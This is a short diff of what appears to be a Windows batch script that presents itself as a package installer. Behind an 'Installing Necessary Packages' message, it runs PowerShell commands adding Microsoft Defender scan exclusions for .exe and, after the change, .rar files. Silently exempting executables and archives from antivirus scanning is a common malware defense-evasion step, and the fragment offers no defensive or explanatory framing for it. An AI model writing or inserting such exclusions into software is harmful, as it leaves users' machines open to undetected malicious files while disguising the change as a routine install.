@@ -29,7 +29,7 @@ echo  Installing Necessary Packages.....Please Wait.......
 
 
 
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".rar""
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
